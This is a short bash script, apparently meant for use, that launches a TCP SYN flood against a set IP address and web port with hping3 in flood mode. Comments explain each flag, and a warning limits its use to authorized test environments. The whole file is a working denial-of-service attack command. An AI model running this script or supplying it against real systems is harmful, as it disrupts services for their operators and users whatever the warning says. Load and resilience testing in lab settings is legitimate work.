#!/bin/bash
# TCP SYN Flood Attack Script
# WARNING: Only execute in an isolated, authorized testing environment.

# Target Specifications
TARGET_IP="192.168.1.10"
TARGET_PORT="80"

echo "Initiating TCP SYN Flood against $TARGET_IP on port $TARGET_PORT..."

# Command Breakdown:
# -S      : Sets the SYN flag on every packet.
# --flood : Sends packets as fast as possible, ignoring replies.
# -V      : Verbose mode.
# -p 80   : Targets the standard web traffic port.

sudo hping3 -S --flood -V -p $TARGET_PORT $TARGET_IP
